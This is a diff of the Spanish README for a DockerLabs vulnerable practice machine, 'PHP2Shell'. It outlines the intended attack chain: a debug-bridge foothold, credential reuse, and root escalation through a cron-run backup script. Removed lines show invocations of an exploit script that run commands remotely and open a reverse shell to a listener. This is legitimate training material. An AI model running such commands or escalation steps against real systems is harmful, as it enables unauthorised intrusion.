@@ -2,10 +2,9 @@
 
 ![DockerLabs](https://img.shields.io/badge/Platform-DockerLabs-blue)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
-![Category](https://img.shields.io/badge/Category-Web%20%2F%20Binary-red)
-![CVEs](https://img.shields.io/badge/CVE-2026--109618%20%7C%20CVE-2026--109619-critical)
+![Category](https://img.shields.io/badge/Category-Web%20%2F%20Privilege%20Escalation-red)
 
-Laboratorio vulnerable diseñado para la plataforma **[DockerLabs.es](https://dockerlabs.es)** enfocado en la explotación del par de vulnerabilidades críticas del núcleo de PHP conocido como **PHP2Shell**.
+Laboratorio vulnerable diseñado para la plataforma **DockerLabs.es** enfocado en enumeración web, aprovechamiento de un puente de depuración heredado (*legacy debug bridge*), análisis de configuraciones internas y escalada de privilegios a través de tareas programadas del sistema.
 
 ---
 
@@ -15,56 +14,36 @@ Laboratorio vulnerable diseñado para la plataforma **[DockerLabs.es](https://do
 * **Dificultad:** Media
 * **Sistema Operativo:** Ubuntu 22.04 LTS (x86_64)
 * **Dominio asignado:** `php2shell.dl`
-* **Dirección IP del laboratorio:** `172.18.0.2`
-* **Puntos clave:**
-  * Explotación RCE de PHP Core (CVE-2026-109618 / CVE-2026-109619).
-  * Enumeración web y buffers multipart.
-  * Reutilización de credenciales (Cumplimiento regla Top 5000 de `rockyou.txt`).
-  * Escalada de privilegios con GTFOBins (`sudo php`).
+* **Vector Inicial:** Explotación de puente de depuración heredado autenticado vía PID dinámico en `api.php`.
+* **Movimiento Lateral:** Reutilización de credencial descubierta en configuración interna de base de datos (`config_db.php`).
+* **Escalada de Privilegios:** Modificación de script de mantenimiento (`/opt/backup/rotate.sh`) ejecutado periódicamente por `root` mediante `cron`.
 * **Flags:**
-  * `user.txt`: `/home/mario/user.txt`
-  * `root.txt`: `/root/root.txt`
+  * **Intermedia:** `/opt/backup/notes.txt`
+  * **User:** `/home/mario/user.txt`
+  * **Root:** `/root/root.txt`
 
 ---
 
 ## 🚀 Despliegue Local
 
-Para levantar el entorno vulnerable localmente, ejecuta con privilegios de administrador:
+Para levantar el entorno vulnerable de forma automática, ejecuta con privilegios de administrador:
 
 ```bash
 sudo bash auto_deploy.sh
 ```
 
-El script configurará automáticamente la red Docker (`172.18.0.0/16`), levantará el contenedor con IP `172.18.0.2` y añadirá la entrada `php2shell.dl` a tu `/etc/hosts`.
+El script configurará la red Docker, levantará el contenedor, asignará dinámicamente la entrada en `/etc/hosts` hacia `php2shell.dl` y mostrará los datos de acceso.
 
-Para detener y limpiar el laboratorio, presiona `Ctrl+C`.
-
----
-
-## 🛠️ Herramientas de Prueba y Explotación
-
-En la carpeta `exploit/` dispones del script automatizado en Python:
-
-```bash
-# Comprobación de estado
-python3 exploit/exploit_php2shell.py -t http://php2shell.dl
-
-# Ejecución de comandos (RCE)
-python3 exploit/exploit_php2shell.py -t http://php2shell.dl -c "whoami"
-
-# Reverse Shell interactiva
-python3 exploit/exploit_php2shell.py -t http://php2shell.dl --lhost 172.18.0.1 --lport 4444
-```
+Para detener y limpiar el laboratorio, presiona `Ctrl+C` en la misma terminal.
 
 ---
 
 ## 📦 Empaquetado para Envío a DockerLabs
 
-Para enviar la máquina a los administradores de DockerLabs o publicarla:
+Para distribuir la máquina a la plataforma, excluye la solución y empaqueta el contenido esencial:
 
 ```bash
-# Generar el archivo comprimido listo para distribución
-tar -czvf php2shell.tar.gz Dockerfile auto_deploy.sh entrypoint.sh config/ html/ exploit/ writeup.md README.md
+tar -czvf php2shell.tar.gz Dockerfile auto_deploy.sh entrypoint.sh config/ html/ README.md
 ```
 
-Consulta el archivo [writeup.md](file:///home/jay/DESARROLLO/PHP/writeup.md) para ver la solución completa paso a paso.
+La guía completa de resolución paso a paso se encuentra documentada en [writeup.md](writeup.md).
